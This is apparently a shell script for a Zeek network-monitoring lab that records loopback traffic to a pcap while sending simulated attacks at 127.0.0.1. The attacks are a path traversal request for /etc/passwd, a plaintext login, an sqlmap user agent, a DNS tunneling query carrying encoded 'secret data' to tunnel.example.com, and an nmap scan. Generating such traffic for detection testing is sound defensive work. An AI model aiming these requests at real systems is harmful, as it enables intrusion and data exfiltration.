#!/bin/sh
# Create test attack traffic on the loopback interface and save it to
# /pcaps/test-traffic.pcap. All traffic stays on this computer.
# Usage (from the host): docker exec zeek sh /scripts/make-test-traffic.sh

OUT=/pcaps/test-traffic.pcap
PORT=18080

echo "[1/5] Recording loopback traffic to $OUT"
tcpdump -i lo -w "$OUT" -U 2>/dev/null &
TCPDUMP_PID=$!
sleep 2

echo "[2/5] Starting a test web server on 127.0.0.1:$PORT"
python3 -m http.server $PORT --bind 127.0.0.1 >/dev/null 2>&1 &
WEB_PID=$!
sleep 2

echo "[3/5] Sending malicious web requests"
curl -s -o /dev/null --path-as-is "http://127.0.0.1:$PORT/../../etc/passwd"
curl -s -o /dev/null -d "user=bob&password=hunter2" "http://127.0.0.1:$PORT/login"
curl -s -o /dev/null -A "sqlmap/1.7" "http://127.0.0.1:$PORT/"

echo "[4/5] Sending a DNS tunneling query"
python3 - <<'EOF'
import socket, struct
name = "aGVsbG8tdGhpcy1pcy1zZWNyZXQtZGF0YS1iZWluZy1zbnVjay1vdXQ.tunnel.example.com"
question = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
packet = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + question + struct.pack(">HH", 1, 1)
socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(packet, ("127.0.0.1", 53))
EOF

echo "[5/5] Port scanning 127.0.0.1 (ports 1-200)"
nmap -sT -p 1-200 127.0.0.1 >/dev/null

sleep 2
kill $WEB_PID $TCPDUMP_PID 2>/dev/null
sleep 1
echo "Saved $OUT"
